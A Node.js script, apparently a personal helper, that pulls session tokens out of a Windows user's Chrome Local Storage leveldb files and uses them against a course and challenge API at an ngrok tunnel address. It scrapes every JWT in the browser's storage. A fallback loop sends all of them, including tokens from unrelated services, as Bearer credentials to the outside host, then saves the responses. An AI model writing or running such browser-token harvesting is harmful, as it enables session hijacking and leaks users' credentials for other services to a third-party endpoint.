const fs = require('fs');
const path = require('path');
const https = require('https');

const chromeProfiles = [
  'c:\\Users\\badr\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
  'c:\\Users\\badr\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb'
];
const apiBase = 'https://cary-nontumorous-unimpedingly.ngrok-free.dev';

const tempDir = path.join(__dirname, 'temp_leveldb');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

function findJWTTokens() {
  const tokens = new Set();
  
  for (const leveldbDir of chromeProfiles) {
    if (!fs.existsSync(leveldbDir)) continue;
    
    console.log(`Scanning profile: ${leveldbDir}`);
    const files = fs.readdirSync(leveldbDir);
    
    for (const file of files) {
      if (file.endsWith('.ldb') || file.endsWith('.log')) {
        const srcPath = path.join(leveldbDir, file);
        const destPath = path.join(tempDir, file);
        try {
          fs.copyFileSync(srcPath, destPath);
          const content = fs.readFileSync(destPath, 'utf8');
          const matches = content.match(/eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g);
          if (matches) {
            matches.forEach(token => tokens.add(token));
          }
        } catch (err) {
        } finally {
          try {
            if (fs.existsSync(destPath)) {
              fs.unlinkSync(destPath);
            }
          } catch (e) {}
        }
      }
    }
  }
  
  try {
    fs.rmdirSync(tempDir);
  } catch (e) {}
  
  return Array.from(tokens);
}

function makeApiRequest(token) {
  return new Promise((resolve, reject) => {
    const url = `${apiBase}/api/get-courses`;
    const options = {
      headers: {
        'Authorization': `Bearer ${token}`,
        'ngrok-skip-browser-warning': 'true',
        'bypass-tunnel-reminder': 'true'
      },
      timeout: 3000
    };
    
    const req = https.get(url, options, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          try {
            const parsed = JSON.parse(data);
            resolve({ token, data: parsed });
          } catch {
            resolve({ token, data: null, error: 'JSON Parse Error' });
          }
        } else {
          resolve({ token, data: null, statusCode: res.statusCode, error: data.slice(0, 100) });
        }
      });
    });

    req.on('timeout', () => {
      req.destroy();
      resolve({ token, data: null, error: 'Timeout' });
    });

    req.on('error', err => {
      resolve({ token, data: null, error: err.message });
    });
  });
}

function fetchChallenges(token) {
  return new Promise((resolve) => {
    const url = `${apiBase}/api/get-my-challenges`;
    const req = https.get(url, { 
      headers: { 
        'Authorization': `Bearer ${token}`, 
        'ngrok-skip-browser-warning': 'true',
        'bypass-tunnel-reminder': 'true'
      },
      timeout: 3000
    }, (res) => {
      let d = '';
      res.on('data', chunk => { d += chunk; });
      res.on('end', () => {
        try { resolve(JSON.parse(d)); } catch { resolve(d); }
      });
    });

    req.on('timeout', () => {
      req.destroy();
      resolve(null);
    });

    req.on('error', () => {
      resolve(null);
    });
  });
}

async function run() {
  const tokens = findJWTTokens();
  console.log(`Found ${tokens.length} candidate JWT tokens total.`);
  
  for (const token of tokens) {
    try {
      const payloadBase64 = token.split('.')[1];
      const payloadDecoded = Buffer.from(payloadBase64, 'base64').toString('utf8');
      const payload = JSON.parse(payloadDecoded);
      
      if (token.length > 200 && !payload.iss?.includes('openai') && !payload.iss?.includes('microsoft')) {
        console.log(`Testing token for user: ${payload.email || payload.name || 'Unknown'}`);
        const result = await makeApiRequest(token);
        if (result.data) {
          console.log('Success! Writing courses to courses_response.json');
          fs.writeFileSync('courses_response.json', JSON.stringify(result.data, null, 2));
          
          const challengesRes = await fetchChallenges(token);
          if (challengesRes) {
            fs.writeFileSync('challenges_response.json', JSON.stringify(challengesRes, null, 2));
            console.log('Success! Writing challenges to challenges_response.json');
          }
          return;
        }
      }
    } catch (e) {
    }
  }
  
  console.log('Done scanning, no valid courses returned. Testing all tokens just in case...');
  for (let i = 0; i < tokens.length; i++) {
    const result = await makeApiRequest(tokens[i]);
    if (result.data) {
      console.log('Success on raw fallback! Writing to courses_response.json');
      fs.writeFileSync('courses_response.json', JSON.stringify(result.data, null, 2));
      const challengesRes = await fetchChallenges(tokens[i]);
      if (challengesRes) {
        fs.writeFileSync('challenges_response.json', JSON.stringify(challengesRes, null, 2));
      }
      return;
    }
  }
  console.log('Failed to find valid course token.');
}

run();
